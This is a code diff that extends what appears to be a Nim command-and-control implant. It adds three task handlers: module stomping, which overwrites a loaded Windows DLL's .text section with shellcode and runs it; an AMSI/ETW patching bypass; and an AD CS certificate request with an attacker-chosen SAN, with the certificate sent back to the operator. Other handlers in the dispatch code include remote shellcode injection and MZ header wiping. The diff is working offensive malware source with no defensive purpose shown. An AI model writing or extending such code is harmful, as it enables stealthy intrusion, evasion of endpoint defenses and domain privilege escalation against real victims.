@@ -164,6 +164,55 @@ when defined(windows):
         bmpFile[d+3] = pixels[s+3]
     return (bmpFile, false)
 
+  # ── SHELLCODE_STOMP ──────────────────────────────────────────────────────────
+  proc doShellcodeStompInner(sc: seq[byte]; dllHint: string): string =
+    let autoTargets = ["xpsservices.dll","clbcatq.dll","msasn1.dll","wbemprox.dll","wbemcomn.dll"]
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0)
+    if snap == INVALID_HANDLE_VALUE: return "[-] shellcode_stomp: snapshot failed"
+    defer: discard CloseHandle(snap)
+    var me: MODULEENTRY32; me.dwSize = DWORD(sizeof(me))
+    var targetBase: LPVOID = nil; var targetName = ""
+    if Module32First(snap, addr me) != 0:
+      while true:
+        let modName = ($cast[cstring](addr me.szModule[0])).toLowerAscii()
+        let pick = if dllHint.len > 0: modName == dllHint.toLowerAscii()
+                   else: autoTargets.contains(modName)
+        if pick:
+          targetBase = me.modBaseAddr
+          targetName = modName
+          break
+        if Module32Next(snap, addr me) == 0: break
+    if targetBase == nil: return "[-] shellcode_stomp: target DLL not loaded"
+
+    # Parse PE → .text section
+    let base = cast[uint](targetBase)
+    let e_lfanew = cast[ptr uint32](base + 0x3C)[]
+    let nt = base + uint(e_lfanew)
+    let numSecs  = cast[ptr uint16](nt + 6)[]
+    let optSz    = cast[ptr uint16](nt + 20)[]
+    var sec = nt + 24 + uint(optSz)
+    var textRva, textSz: uint32
+    for _ in 0..<int(numSecs):
+      let nameBytes = cast[cstring](sec)
+      if $nameBytes == ".text":
+        textSz  = cast[ptr uint32](sec + 16)[]
+        textRva = cast[ptr uint32](sec + 12)[]
+        break
+      sec += 40
+    if textSz == 0: return "[-] shellcode_stomp: no .text in " & targetName
+
+    let writeAddr = cast[LPVOID](base + uint(textRva))
+    let writeLen  = SIZE_T(min(sc.len, int(textSz)))
+    var old: DWORD = 0
+    discard VirtualProtect(writeAddr, writeLen, PAGE_READWRITE, addr old)
+    copyMem(writeAddr, unsafeAddr sc[0], int(writeLen))
+    discard VirtualProtect(writeAddr, writeLen, PAGE_EXECUTE_READ, addr old)
+    let ht = callCreateThread(nil, 0, writeAddr, nil, 0, nil)
+    if ht == 0: return "[-] shellcode_stomp: CreateThread failed"
+    discard callCloseHandle(ht)
+    "[+] shellcode_stomp: " & targetName & "+0x" & toHex(textRva, 8) &
+      " sc=" & $sc.len & " B \xe2\x86\x92 executing"
+
   # ── In-process shellcode execution (STAGE2) ──────────────────────────────────
   proc doSelfInject(sc: seq[byte]): string =
     let mem = VirtualAlloc(nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
@@ -1626,6 +1675,14 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     else:
       t.sendResult(id, "", "UDRL: not supported on Linux")
 
+  of "SHELLCODE_STOMP":
+    when defined(windows):
+      if payload.len == 0: t.sendResult(id, "", "SHELLCODE_STOMP: no shellcode payload"); return
+      let dllHint = (try: parseJson(args){"dll"}.getStr("") except: "")
+      t.sendResult(id, doShellcodeStompInner(payload, dllHint), "")
+    else:
+      t.sendResult(id, "", "SHELLCODE_STOMP: Windows only")
+
   of "INJECT_REMOTE":
     when defined(windows):
       if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
@@ -1840,6 +1897,15 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "WIPE_MZ":
     wipeMZHeader()
     t.sendResult(id, "[+] MZ header wiped", "")
+
+  of "AMSI_BYPASS":
+    when defined(windows):
+      patchAMSI()
+      patchETW()
+      disableETWProcess()
+      t.sendResult(id, "[+] AMSI/ETW re-patched", "")
+    else:
+      t.sendResult(id, "", "AMSI_BYPASS: Windows only")
 
   of "DETECTED":
     t.sendResult(id, "[!] DETECTED flag acknowledged", "")
@@ -2637,6 +2703,34 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
 
   of "NET_USE_DEL":
     t.sendResult(id, runShell("net use \"" & args.strip() & "\" /delete /yes 2>&1"), "")
+
+  of "ADCS_REQUEST":
+    try:
+      let j    = parseJson(args)
+      let ca   = j{"ca"}.getStr("")
+      let tmpl = j{"template"}.getStr("")
+      let subj = j{"subject"}.getStr("CN=user")
+      let san  = j{"san"}.getStr("")
+      var out_path = j{"out"}.getStr("")
+      let pid  = getCurrentProcessId()
+      let inf  = r"C:\Users\Public\adcs_" & $pid & ".inf"
+      let csr  = r"C:\Users\Public\adcs_" & $pid & ".csr"
+      if out_path == "": out_path = r"C:\Users\Public\adcs_" & $pid & ".cer"
+      var sanLine = ""
+      if san != "": sanLine = "\r\nSAN=upn=" & san
+      let infContent = "[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"" & subj & "\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate=" & tmpl & sanLine & "\r\n"
+      writeFile(inf, infContent)
+      let o1 = runShell("certreq -new \"" & inf & "\" \"" & csr & "\" 2>&1")
+      let o2 = runShell("certreq -submit -config \"" & ca & "\" \"" & csr & "\" \"" & out_path & "\" 2>&1")
+      var certB64 = ""
+      try:
+        let certBytes = readFile(out_path)
+        certB64 = "\ncert_b64=" & encode(certBytes)
+      except: discard
+      try: removeFile(inf) except: discard
+      try: removeFile(csr) except: discard
+      t.sendResult(id, o1 & "\n" & o2 & certB64, "")
+    except: t.sendResult(id, "", "adcs_request: " & getCurrentExceptionMsg())
 
   of "WHOAMI":
     t.sendResult(id, runShell("whoami /all"), "")
